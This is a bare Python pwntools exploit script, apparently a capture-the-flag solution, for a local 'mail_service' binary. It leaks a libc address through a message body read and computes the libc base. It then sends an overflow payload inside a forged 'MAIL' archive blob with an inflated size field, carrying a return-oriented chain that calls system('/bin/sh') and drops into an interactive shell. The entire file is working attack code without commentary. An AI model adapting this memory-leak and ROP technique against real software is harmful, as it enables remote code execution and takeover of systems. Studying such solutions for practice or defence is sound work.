#!/usr/bin/env python3

from pwn import *
elf = ELF('./mail_service_patched')
libc = ELF('./libc.so.6')
context.binary = elf
def main():
    p = remote('127.0.0.1',1337)
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b': ',b'1')
    p.recvuntil(b'Body:\n')
    ar_stdout = u64(p.recv(0x110)[0x103:0x10b])
    print(f'stdout = {hex(ar_stdout)}')
    libc.address = ar_stdout - libc.sym['_IO_2_1_stdout_']
    print(hex(libc.address))
    rop = ROP(libc)
    shell = b'a'*3+0x98*b'a'+ p64(rop.find_gadget(['ret'])[0]) + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']) 
    size = 0x98 + 8*4
    p.sendlineafter(b'> ',b'6')
    p.sendafter(b'Paste archive blob:\n',b'MAIL\x01'+3*p16(1) + p16(size))
    p.send(shell)
    p.interactive()
    p.close()

if __name__ == "__main__":
    main()
